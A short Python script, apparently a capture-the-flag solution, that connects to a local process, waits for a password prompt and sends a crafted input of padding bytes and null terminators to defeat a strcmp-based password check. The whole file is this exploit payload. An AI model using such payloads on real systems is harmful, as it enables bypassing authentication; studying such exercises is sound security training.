import interact
import struct

## concept is to understand how strcmp performs the task
# null terminator is the key
p = interact.Process()
data = p.readuntil('password:')
p.sendline('A'*17+'\0'+ 'C'*14+'A'*17+'\0')

p.interactive()